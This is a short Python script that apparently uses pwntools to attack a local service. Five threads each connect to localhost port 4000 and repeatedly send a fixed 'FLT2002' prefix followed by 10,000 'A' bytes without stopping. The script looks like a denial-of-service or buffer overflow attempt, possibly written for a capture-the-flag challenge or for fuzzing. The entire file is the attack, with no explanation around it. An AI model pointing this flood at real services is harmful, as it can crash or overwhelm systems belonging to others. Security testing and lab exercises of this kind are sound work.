#!/usr/bin/env python312

from pwn import *
import time
import threading
import subprocess

threads = []

def send_payload():
    r = remote("localhost", 4000)
    while True:
        r.send(b"FLT2002" + b"A" * 10000)

for _ in range(5):
    new_thread = threading.Thread(target=send_payload)
    threads.append(new_thread)
    new_thread.start()

for old_thread in threads:
    old_thread.join()
